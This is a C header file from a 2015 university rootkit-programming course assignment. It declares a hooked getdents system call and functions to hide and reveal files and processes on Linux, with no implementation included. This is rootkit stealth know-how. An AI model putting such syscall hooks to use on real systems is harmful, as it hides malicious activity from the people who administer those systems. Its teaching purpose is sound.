
/*******************************************************************************/
/*                                                                             */
/*   Course: Rootkit Programming                                               */
/*   Semester: WS 2015/16                                                      */
/*   Team: 105                                                                 */
/*   Assignment: 3                                                             */
/*                                                                             */
/*   Filename: process_masker.h                                                */
/*                                                                             */
/*   Authors:                                                                  */
/*       Name: Matei Pavaluca                                                  */
/*       Email: mateipavaluca@yahoo.com                                        */
/*                                                                             */
/*       Name: Nedko Stefanov Nedkov                                           */
/*       Email: nedko.stefanov.nedkov@gmail.com                                */
/*                                                                             */
/*   Date: November 2015                                                       */
/*                                                                             */
/*   Usage:                                                                    */
/*                                                                             */
/*******************************************************************************/

#ifndef __PROCESS_MASKER__
#define __PROCESS_MASKER__


#define PIDS_BUFFSIZE 8

struct linux_dirent {
	long d_ino;
	off_t d_off;
	unsigned short d_reclen;
	char d_name[];
};

asmlinkage int my_getdents_syscall(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
int should_mask(const char *name);

void hide_file(char *);
void reveal_file(char *);


#endif
